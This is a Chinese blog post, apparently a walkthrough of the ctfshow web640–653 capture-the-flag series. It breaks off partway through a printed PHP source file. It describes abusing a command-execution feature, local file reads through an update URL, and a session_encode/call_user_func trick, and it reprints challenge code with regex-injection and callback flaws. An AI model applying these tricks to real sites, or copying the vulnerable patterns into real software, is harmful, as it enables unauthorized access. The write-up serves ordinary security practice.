<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="伊卡洛维奇"><meta name="copyright" content="伊卡洛维奇"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>ctfshow终极考核 | Ikalovic@Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"lunereal.1kal0vic.top","root":"/","title":"kawayi","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="web640打开页面，首页就是。 web641抓包即可看到。 web642F12查看源代码，发现可疑路径&#x2F;system36d&#x2F;，访问发现302跳转然后又闪了一个页面最后跳到了login页面，查看抓包记录，可以看到中间页面给出了flag  web644在&#x2F;system36d&#x2F;login.php发现要输入密码，F12查看js发现密码，输入得到flag  web6">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow终极考核">
<meta property="og:url" content="http://lunereal.1kal0vic.top/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/index.html">
<meta property="og:site_name" content="Ikalovic@Hexo">
<meta property="og:description" content="web640打开页面，首页就是。 web641抓包即可看到。 web642F12查看源代码，发现可疑路径&#x2F;system36d&#x2F;，访问发现302跳转然后又闪了一个页面最后跳到了login页面，查看抓包记录，可以看到中间页面给出了flag  web644在&#x2F;system36d&#x2F;login.php发现要输入密码，F12查看js发现密码，输入得到flag  web6">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/1.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/2.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/3.png">
<meta property="article:published_time" content="2025-11-05T15:00:23.000Z">
<meta property="article:modified_time" content="2025-11-06T12:25:55.713Z">
<meta property="article:author" content="伊卡洛维奇">
<meta property="article:tag" content="-web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="伊卡洛维奇"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="伊卡洛维奇"><span class="site-author-status" title="loli赛高">☺️</span></a><div class="site-author-name"><a href="/about/">伊卡洛维奇</a></div><span class="site-name">Ikalovic@Hexo</span><sub class="site-subtitle">kawayi</sub><div class="site-description">loli赛高</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/girls/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:women-line"></span></span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Ikalovic" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/327357699" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web640"><span class="toc-number">1.</span> <span class="toc-text">web640</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web641"><span class="toc-number">2.</span> <span class="toc-text">web641</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web642"><span class="toc-number">3.</span> <span class="toc-text">web642</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web644"><span class="toc-number">4.</span> <span class="toc-text">web644</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web643"><span class="toc-number">5.</span> <span class="toc-text">web643</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web645"><span class="toc-number">6.</span> <span class="toc-text">web645</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web646"><span class="toc-number">7.</span> <span class="toc-text">web646</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web647"><span class="toc-number">8.</span> <span class="toc-text">web647</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web648"><span class="toc-number">9.</span> <span class="toc-text">web648</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web649"><span class="toc-number">10.</span> <span class="toc-text">web649</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web653"><span class="toc-number">11.</span> <span class="toc-text">web653</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://lunereal.1kal0vic.top/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="伊卡洛维奇"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ikalovic@Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ctfshow终极考核</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-11-05 23:00:23" itemprop="dateCreated datePublished" datetime="2025-11-05T23:00:23+08:00">2025-11-05</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-11-06 20:25:55" itemprop="dateModified" datetime="2025-11-06T20:25:55+08:00">2025-11-06</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">-知识积累</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">-web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="web640"><a href="#web640" class="headerlink" title="web640"></a>web640</h1><p>打开页面，首页就是。</p>
<h1 id="web641"><a href="#web641" class="headerlink" title="web641"></a>web641</h1><p>抓包即可看到。</p>
<h1 id="web642"><a href="#web642" class="headerlink" title="web642"></a>web642</h1><p>F12查看源代码，发现可疑路径&#x2F;system36d&#x2F;，访问发现302跳转然后又闪了一个页面最后跳到了login页面，查看抓包记录，可以看到中间页面给出了flag</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/1.png" alt="1" loading="lazy"></p>
<h1 id="web644"><a href="#web644" class="headerlink" title="web644"></a>web644</h1><p>在&#x2F;system36d&#x2F;login.php发现要输入密码，F12查看js发现密码，输入得到flag</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/2.png" alt="2" loading="lazy"></p>
<h1 id="web643"><a href="#web643" class="headerlink" title="web643"></a>web643</h1><p>在系统设置-网络测试处可以执行指令，使用ls，得到可疑路径secret.txt，访问获得flag</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/ctfshow/%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/3.png" alt="3" loading="lazy"></p>
<h1 id="web645"><a href="#web645" class="headerlink" title="web645"></a>web645</h1><p>使用数据管理-数据备份可以看到flag。</p>
<h1 id="web646"><a href="#web646" class="headerlink" title="web646"></a>web646</h1><p>在系统更新-远程更新，点击在线更新显示地址不可达。</p>
<p>抓包，将<strong>update_address</strong>的值改为**%2Fvar%2Fwww%2Fhtml%2Fsystem36d%2Fmain.php**，发包，获得main.php的源码，发现init.php。</p>
<p>然后将main.php改为init.php,得到flag</p>
<h1 id="web647"><a href="#web647" class="headerlink" title="web647"></a>web647</h1><p>结合之前的ls，我们可以一个个访问文件获得源码，然后进行代码审计。</p>
<p>&#x2F;system36d&#x2F;checklogin.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$s=$_GET[&#x27;s&#x27;];</span><br><span class="line">setcookie(&#x27;uid&#x27;,intval($s));</span><br><span class="line">$_SESSION[&#x27;user_id&#x27;]=intval($s);</span><br><span class="line">header(&#x27;location:main.php&#x27;);</span><br></pre></td></tr></table></figure>
<p>&#x2F;system36d&#x2F;users.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[&#x27;action&#x27;];switch ($a) &#123;        </span><br><span class="line"># ...</span><br><span class="line">    case &#x27;evilString&#x27;:</span><br><span class="line">        evilString($_GET[&#x27;m&#x27;]);</span><br><span class="line">        break;</span><br><span class="line">&#125;function evilString($m)&#123;</span><br><span class="line">    $key = &#x27;372619038&#x27;;</span><br><span class="line">    $content = call_user_func($m);</span><br><span class="line">    if(stripos($content, $key)!==FALSE)&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not 372619038?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以在checklogin.php 设置session值，然后访问users.php调用session_encode即可。</p>
<p>先访问<br>&#x2F;system36d&#x2F;checklogin.php?s&#x3D;372619038<br>再访问<br>&#x2F;system36d&#x2F;users.php?action&#x3D;evilString&amp;m&#x3D;session_encode</p>
<p>即可获得flag</p>
<p>ctfshow{e6ad8304cdb562971999b476d8922219}</p>
<h1 id="web648"><a href="#web648" class="headerlink" title="web648"></a>web648</h1><p>users.php代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserManager</span><br><span class="line">&#123;</span><br><span class="line">    const DB_PATH = &#x27;users.dat&#x27;;</span><br><span class="line">    const FLAG645 = &#x27;your_flag_here&#x27;; // 定义常量</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 获取用户列表</span><br><span class="line">     */</span><br><span class="line">    public static function getUsers($data, $page = 1, $limit = 10)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;数据获取成功&#x27;,</span><br><span class="line">            &#x27;data&#x27; =&gt; []</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $users = explode(&#x27;|&#x27;, $data);</span><br><span class="line">        array_pop($users);</span><br><span class="line">        $index = 1;</span><br><span class="line"></span><br><span class="line">        foreach ($users as $user) &#123;</span><br><span class="line">            $userParts = explode(&#x27;@&#x27;, $user);</span><br><span class="line">            $username = $userParts[0];</span><br><span class="line">            </span><br><span class="line">            if ($username == &#x27;admin&#x27;) &#123;</span><br><span class="line">                $isAdmin = &#x27;是&#x27;;</span><br><span class="line">                $password = &#x27;flag就是管理员的密码，不过我隐藏了&#x27;;</span><br><span class="line">                $content = &#x27;删除此条记录后flag就会消失&#x27;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $isAdmin = &#x27;否&#x27;;</span><br><span class="line">                $password = $userParts[1];</span><br><span class="line">                $content = &#x27;无&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $ret[&#x27;data&#x27;][] = [</span><br><span class="line">                &#x27;id&#x27; =&gt; $index,</span><br><span class="line">                &#x27;username&#x27; =&gt; $username,</span><br><span class="line">                &#x27;password&#x27; =&gt; $password,</span><br><span class="line">                &#x27;isAdmin&#x27; =&gt; $isAdmin,</span><br><span class="line">                &#x27;content&#x27; =&gt; $content</span><br><span class="line">            ];</span><br><span class="line">            </span><br><span class="line">            $index++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ret[&#x27;count&#x27;] = $index;</span><br><span class="line">        $start = ($page - 1) * $limit;</span><br><span class="line">        $ret[&#x27;data&#x27;] = array_slice($ret[&#x27;data&#x27;], $start, $limit, true);</span><br><span class="line"></span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 添加用户</span><br><span class="line">     */</span><br><span class="line">    public static function addUser($data, $username, $password)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;添加成功&#x27;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        if (self::existsUser($data, $username) == 0) &#123;</span><br><span class="line">            $newData = $data . $username . &#x27;@&#x27; . $password . &#x27;|&#x27;;</span><br><span class="line">            file_put_contents(self::DB_PATH, $newData);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ret[&#x27;code&#x27;] = -1;</span><br><span class="line">            $ret[&#x27;message&#x27;] = &#x27;用户已存在&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 更新用户信息</span><br><span class="line">     */</span><br><span class="line">    public static function updateUser($data, $username, $password)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;更新成功&#x27;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        if (self::existsUser($data, $username) &gt; 0 &amp;&amp; $username != &#x27;admin&#x27;) &#123;</span><br><span class="line">            $pattern = &#x27;/&#x27; . $username . &#x27;@[0-9a-zA-Z]+\|/&#x27;;</span><br><span class="line">            $replacement = $username . &#x27;@&#x27; . $password . &#x27;|&#x27;;</span><br><span class="line">            $newData = preg_replace($pattern, $replacement, $data);</span><br><span class="line">            file_put_contents(self::DB_PATH, $newData);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ret[&#x27;code&#x27;] = -1;</span><br><span class="line">            $ret[&#x27;message&#x27;] = &#x27;用户不存在或无权更新&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 删除用户</span><br><span class="line">     */</span><br><span class="line">    public static function delUser($data, $username)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = [</span><br><span class="line">            &#x27;code&#x27; =&gt; 0,</span><br><span class="line">            &#x27;message&#x27; =&gt; &#x27;删除成功&#x27;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        if (self::existsUser($data, $username) &gt; 0 &amp;&amp; $username != &#x27;admin&#x27;) &#123;</span><br><span class="line">            $pattern = &#x27;/&#x27; . $username . &#x27;@[0-9a-zA-Z]+\|/&#x27;;</span><br><span class="line">            $newData = preg_replace($pattern, &#x27;&#x27;, $data);</span><br><span class="line">            file_put_contents(self::DB_PATH, $newData);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ret[&#x27;code&#x27;] = -1;</span><br><span class="line">            $ret[&#x27;message&#x27;] = &#x27;用户不存在或无权删除&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 检查用户是否存在</span><br><span class="line">     */</span><br><span class="line">    public static function existsUser($data, $username)</span><br><span class="line">    &#123;</span><br><span class="line">        $pattern = &#x27;/&#x27; . $username . &#x27;@[0-9a-zA-Z]+\|/&#x27;;</span><br><span class="line">        return preg_match($pattern, $data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 备份用户数据</span><br><span class="line">     */</span><br><span class="line">    public static function backupUsers()</span><br><span class="line">    &#123;</span><br><span class="line">        $file_name = self::DB_PATH;</span><br><span class="line">        </span><br><span class="line">        if (!file_exists($file_name)) &#123;</span><br><span class="line">            header(&#x27;HTTP/1.1 404 NOT FOUND&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $file = fopen($file_name, &quot;rb&quot;);</span><br><span class="line">            